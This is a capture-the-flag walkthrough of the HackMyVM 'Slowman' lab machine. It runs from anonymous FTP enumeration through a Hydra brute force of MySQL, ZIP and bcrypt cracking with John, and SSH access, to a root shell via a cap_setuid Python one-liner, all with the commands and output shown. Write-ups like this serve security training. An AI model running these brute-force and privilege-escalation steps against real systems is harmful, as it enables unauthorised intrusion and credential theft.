# slowman

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| slowman | Pylon | Beginner | HackMyVM |

**Summary:** The exploitation of the Slowman machine involves a multi stage process starting with information disclosure through an anonymous FTP service. This initial discovery provides a username that allows for a targeted brute force attack against the MySQL database. Once internal access to the database is achieved, the researcher uncovers a hidden web directory and administrative credentials. This leads to the discovery of a password protected ZIP archive on the web server. By applying offline cryptographic attacks against the archive and a subsequent bcrypt hash found within it, the researcher obtains valid SSH credentials for the user trainerjean. The final privilege escalation is achieved by identifying a Python binary configured with the CAP_SETUID capability, which is leveraged to manipulate the process identity and spawn a root shell, resulting in complete system takeover.

---

## Detailed Walkthrough

**1. Network Discovery and Reconnaissance**

The engagement begins with a network sweep to identify the target IP address within the local subnet. Once the host is located, a comprehensive port scan is performed to map the attack surface.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.178 08:00:27:0A:2C:77 VirtualBox
```

The Nmap scan reveals several interesting services including FTP, SSH, HTTP, and MySQL.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slowman]
└─$ nmap -sC -sV -p- 192.168.100.178
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-05 19:31 WIB
Nmap scan report for 192.168.100.178
Host is up (0.0056s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE  SERVICE  VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp      vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.100.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp   open   ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 02:d6:5e:01:45:5b:8d:2d:f9:cb:0b:df:45:67:04:22 (ECDSA)
|_  256 f9:ce:4a:75:07:d0:05:1d:fb:a7:a7:69:39:1b:08:10 (ED25519)
80/tcp   open   http     Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Fastgym
3306/tcp open   mysql    MySQL 8.0.35-0ubuntu0.22.04.1
| mysql-info:
|   Protocol: 10
|   Version: 8.0.35-0ubuntu0.22.04.1
|   Thread ID: 9
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, SwitchToSSLAfterHandshake, ODBCClient, Speaks41ProtocolOld, ConnectWithDatabase, IgnoreSigpipes, LongColumnFlag, FoundRows, SupportsTransactions, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, InteractiveClient, SupportsLoadDataLocal, SupportsCompression, IgnoreSpaceBeforeParenthesis, LongPassword, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: !(\x1C\x0E77k+n[h\x1Cv[r/\x02bF&
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.35_Auto_Generated_Server_Certificate
| Not valid before: 2023-11-22T19:44:52
|_Not valid after:  2033-11-19T19:44:52
|_ssl-date: TLS randomness does not represent time
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.85 seconds
```

**2. FTP Enumeration and User Discovery**

The FTP service allows anonymous access. A file named allowedusersmysql.txt is identified and downloaded, which contains the username trainerjeff.

```powershell
PS D:\hackmyvm-writeups\machines\slowman> curl.exe -P - ftp://192.168.100.178/ --user anonymous:
-rw-r--r--    1 0        0              12 Nov 22  2023 allowedusersmysql.txt

PS D:\hackmyvm-writeups\machines\slowman> curl.exe -P - ftp://192.168.100.178/allowedusersmysql.txt --user anonymous:
trainerjeff
```

**3. Database Exploitation**

With a valid username in hand, a brute force attack is launched against the MySQL service using Hydra and the rockyou.txt wordlist.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slowman]
└─$ hydra -l trainerjeff -P /usr/share/wordlists/rockyou.txt mysql://192.168.100.178
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-05 19:53:22
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://192.168.100.178:3306/
[3306][mysql] host: 192.168.100.178   login: trainerjeff   password: s[REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-05 19:53:39
```

After gaining access to the database, a query reveals a table named users containing credentials for gonzalo and a hidden login URL.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slowman]
└─$ mysql -u trainerjeff -h 192.168.100.178 -p --skip-ssl
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 1074
Server version: 8.0.35-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| trainers_db        |
+--------------------+
5 rows in set (0.097 sec)

MySQL [none]> use trainers_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [trainers_db]> show tables;
+-----------------------+
| Tables_in_trainers_db |
+-----------------------+
| users                 |
+-----------------------+
1 row in set (0.005 sec)

MySQL [trainers_db]> select * from users;
+----+-----------------+-------------------------------+
| id | user            | password                      |
+----+-----------------+-------------------------------+
|  1 | gonzalo         | tH1[REDACTED]                 |
|  2 | $SECRETLOGINURL | /secretLOGIN/login.html       |
+----+-----------------+-------------------------------+
2 rows in set (0.007 sec)
```

**4. Web Infiltration and Data Extraction**

Navigating to the discovered secret URL presents a login page. Using the credentials for gonzalo allows for successful authentication.

![](image.png)

Inside the protected area, a link to a file named credentials.zip is found.

![](image-1.png)

The archive is downloaded for further analysis.

**5. ZIP Cracking and Credential Recovery**

The ZIP file is found to be password protected. The hash is extracted using zip2john and then cracked with John the Ripper.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slowman]
└─$ file credentials.zip
credentials.zip: Zip archive data, made by v3.0 UNIX, extract using at least v2.0, last modified Nov 22 2023 19:48:04, uncompressed size 117, method=deflate

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slowman]
└─$ zip2john credentials.zip > hash
ver 2.0 efh 5455 efh 7875 credentials.zip/passwords.txt PKZIP Encr: TS_chk, cmplen=117, decmplen=117, crc=4981406D ts=9E02 cs=9e02 type=8

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slowman]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s[REDACTED]       (credentials.zip/passwords.txt)
1g 0:00:00:00 DONE (2026-05-05 20:00) 33.33g/s 273066p/s 273066c/s 273066C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Extracting the contents reveals a file named passwords.txt which contains a bcrypt hash for the user trainerjean.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slowman]
└─$ unzip credentials.zip
Archive:  credentials.zip
[credentials.zip] passwords.txt password:
  inflating: passwords.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slowman]
└─$ cat passwords.txt
----------
$USERS: trainerjean

$PASSWORD: $2y$10$[REDACTED]
----------
```

This hash is then cracked to reveal the cleartext password.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slowman]
└─$ echo '$2y$10$[REDACTED]' > hash

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slowman]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
t[REDACTED]          (?)
1g 0:00:00:18 DONE (2026-05-05 20:01) 0.05405g/s 60.32p/s 60.32c/s 60.32C/s thuglife..brittney
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

**6. Initial Access**

The cracked password allows for a successful SSH login as the user trainerjean.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/slowman]
└─$ ssh trainerjean@192.168.100.178
trainerjean@192.168.100.178's password:
...
trainerjean@slowman:~$ id
uid=1002(trainerjean) gid=1002(trainerjean) groups=1002(trainerjean)
trainerjean@slowman:~$ ls -la
total 32
drwxr-x--- 3 trainerjean trainerjean 4096 nov 23  2023 .
drwxr-xr-x 5 root        root        4096 nov 23  2023 ..
lrwxrwxrwx 1 root        root           9 nov 23  2023 .bash_history -> /dev/null
-rw-r--r-- 1 trainerjean trainerjean  220 nov 22  2023 .bash_logout
-rw-r--r-- 1 trainerjean trainerjean 3771 nov 22  2023 .bashrc
drwx------ 2 trainerjean trainerjean 4096 nov 22  2023 .cache
-rw-r--r-- 1 trainerjean trainerjean  807 nov 22  2023 .profile
-rw------- 1 trainerjean trainerjean   77 nov 23  2023 .python_history
-rw-r--r-- 1 root        root          29 nov 23  2023 user.txt
```

**7. Privilege Escalation**

Internal enumeration reveals a .python_history file suggesting previous administrative actions involving Python. A check for capabilities confirms that the Python 3.10 binary has the cap_setuid capability set.

```bash
trainerjean@slowman:~$ cat .python_history
import os
os.system('bash')
os.system('0')
os.setid('0')
os.setuid('0')
exit

trainerjean@slowman:~$ /usr/sbin/getcap -r / 2>/dev/null
/snap/core20/2015/usr/bin/ping cap_net_raw=ep
/snap/core20/1974/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/python3.10 cap_setuid=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
```

By using Python to set the process UID to zero, a root shell is spawned, allowing the researcher to read the final flags.

```bash
trainerjean@slowman:~$ /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@slowman:~# su -
root@slowman:~# id
uid=0(root) gid=0(root) groups=0(root)
root@slowman:~# cat /home/trainerjean/user.txt
YOU[REDACTED]
root@slowman:~# cat /root/root.txt
Y0U[REDACTED]
```

---

## Attack Chain Summary
1. **Reconnaissance**: Initial network scanning identified the target IP address and open ports including FTP, SSH, and MySQL.
2. **Vulnerability Discovery**: Information disclosure via anonymous FTP provided a candidate username for further exploitation.
3. **Exploitation**: A brute force attack against MySQL followed by database enumeration revealed a hidden web endpoint and credentials.
4. **Internal Enumeration**: Authentication to the secret web page led to the recovery and cracking of a protected ZIP archive and a bcrypt hash.
5. **Privilege Escalation**: Identification of the CAP_SETUID capability on a Python binary allowed for privilege escalation from a standard user to root.

